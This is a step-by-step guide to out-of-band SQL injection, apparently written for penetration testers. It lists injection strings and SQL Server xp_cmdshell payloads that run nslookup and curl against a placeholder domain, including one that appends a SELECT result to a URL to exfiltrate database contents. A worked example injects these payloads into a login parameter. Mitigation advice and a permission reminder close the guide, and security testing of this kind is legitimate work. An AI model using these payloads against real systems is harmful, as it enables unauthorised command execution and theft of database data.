# Out-of-Band SQL Injection (SQLi) Guide

Out-of-Band (OOB) SQL Injection occurs when an attacker is able to exploit a SQL injection vulnerability to trigger a request to an external server or service, typically to extract data or test for vulnerabilities. Unlike in-band SQLi, where the data is retrieved directly through the same channel as the application response, OOB SQLi uses different channels, such as DNS or HTTP requests, to exfiltrate data.

## Steps to Perform Out-of-Band SQL Injection

### 1. **Identify Injection Points**
1. **Explore the Application**: Look for input fields, URL parameters, cookies, or HTTP headers that interact with the database. Common targets include search fields, login forms, and URL parameters.
2. **Test for Basic SQL Injection**: Begin by testing these inputs with basic SQL payloads to check if they are injectable. Example payloads include:
     ```SQL
     '
     "
     ' OR '1'='1
     ```

### 2. **Determine Injection Vulnerability**
1. **Check for Error-Based SQLi**: Inject payloads that may cause errors to confirm SQL injection. For example:
     ```SQL
     ' AND 1=1--
     ' AND 1=2--
     ```
     Look for application behavior changes or errors to determine vulnerability.

2. **Test for Blind SQLi**: Inject boolean-based payloads to infer information:
     ```SQL
     ' AND 1=1--
     ' AND 1=2--
     ```
     Analyze the application's response to identify if the parameter is injectable.

### 3. **Set Up an Out-of-Band Channel**

1. **Prepare the OOB Receiver**: Set up an external server to receive out-of-band requests. This can be done using tools like:
   - **DNS Server**: Use a service like `dnslog.cn` to capture DNS requests.
   - **HTTP Server**: Set up an HTTP server (e.g., using tools like `Burp Collaborator`, `ngrok`, or custom scripts) to capture HTTP requests.

2. **Configure the Receiver**: Ensure your OOB receiver is properly configured to log and capture incoming requests.

### 4. **Inject OOB Payloads**

1. **DNS-Based OOB SQLi**: Inject payloads that trigger DNS requests to your external server. For example, to test if the server can perform a DNS lookup:
     ```SQL
     ' OR 1=1; EXEC xp_cmdshell('nslookup yourdomain.com')--
     ```
     The server will attempt to resolve `yourdomain.com`, and you should see a request in your DNS logs if successful.

2. **HTTP-Based OOB SQLi**: Inject payloads that trigger HTTP requests to your external server. Example:
     ```SQL
     ' OR 1=1; EXEC xp_cmdshell('curl http://yourdomain.com?data=important')--
     ```
     The server will make an HTTP request to `yourdomain.com`, and you should see the request in your HTTP logs.

### 5. **Extract Data Using OOB SQLi**

1. **Extract Data via DNS**: Use DNS-based payloads to exfiltrate data by encoding data into DNS requests. For example, to extract a specific piece of information:
     ```SQL
     ' OR 1=1; EXEC xp_cmdshell('nslookup -type=txt data.yourdomain.com')--
     ```
     Replace `data.yourdomain.com` with the encoded data you wish to exfiltrate. The external server will log the DNS request containing the data.

2. **Extract Data via HTTP**: Use HTTP-based payloads to send data to your server. For example, to send data from the database:
     ```SQL
     ' OR 1=1; EXEC xp_cmdshell('curl http://yourdomain.com?data=' + (SELECT top 1 column_name FROM table_name))--
     ```
     The server will log the HTTP request containing the data.

### 6. **Verify and Document Findings**

1. **Verify OOB Requests**: Confirm that your external server is receiving requests as expected. Check your logs for DNS queries or HTTP requests to ensure successful data exfiltration.
2. **Document Results**: Record details of your findings, including:
   - Injection points and payloads used
   - Data extracted and its implications
   - Observed behavior and any server logs
   - Capture screenshots or save request/response logs as evidence.

3. **Assess Impact**: Evaluate the impact of the SQLi vulnerability based on the data exfiltrated and its sensitivity.

4. **Prepare Recommendations**: Provide recommendations for mitigating SQLi vulnerabilities, such as:
   - Implementing input validation and parameterized queries
   - Restricting database functions like `xp_cmdshell`
   - Using web application firewalls (WAFs) to monitor and block malicious requests

## EXAMPLE SCENARIO: Testing a Login Parameter

1. **Identify Injection Point**: Suppose you have a login parameter `username` in a form, such as `http://target.com/login?username=test`.
2. **Test for Basic SQL Injection**: Try a simple payload to check if the parameter is injectable:
     ```SQL
     http://target.com/login?username=test'
     ```

3. **Set Up OOB Receiver**: Set up an HTTP server to receive incoming requests.

4. **Inject OOB Payloads**:
   - **DNS-Based**: Test with a payload that triggers a DNS request:
     ```SQL
     http://target.com/login?username=test' OR 1=1; EXEC xp_cmdshell('nslookup yourdomain.com')--
     ```
   - **HTTP-Based**: Test with a payload that triggers an HTTP request:
     ```SQL
     http://target.com/login?username=test' OR 1=1; EXEC xp_cmdshell('curl http://yourdomain.com?data=important')--
     ```

5. **Verify OOB Requests**: Check your external server logs for DNS queries or HTTP requests to confirm that data is being exfiltrated.

## Conclusion

Out-of-Band SQL Injection involves exploiting SQL injection vulnerabilities to trigger requests to external servers or services, allowing attackers to extract data indirectly. By using DNS or HTTP requests as out-of-band channels, you can exfiltrate data from the database even when direct output is not possible.

Always ensure you have explicit permission to perform penetration testing and adhere to ethical guidelines during your assessment.
